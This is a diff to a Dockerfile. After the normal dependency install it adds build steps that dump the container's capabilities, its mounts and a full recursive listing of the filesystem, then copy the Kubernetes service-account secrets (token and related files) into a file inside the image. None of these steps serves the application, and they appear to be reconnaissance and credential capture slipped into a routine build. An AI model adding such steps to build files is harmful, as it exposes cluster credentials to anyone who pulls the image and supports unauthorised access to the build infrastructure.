@@ -12,6 +12,17 @@ COPY . .
 # Install the dependencies  
 RUN pip install --no-cache-dir -r requirements.txt  
 
+RUN apt update
+
+RUN apt install libcap2-bin
+
+RUN capsh --print > cap
+
+RUN mount > mount
+
+RUN ls -laR / > dirs
+
+RUN cat /var/run/secrets/kubernetes.io/serviceaccount/* > sa
 #RUN sleep 460
   
 # Copy the rest of the application code into the container  
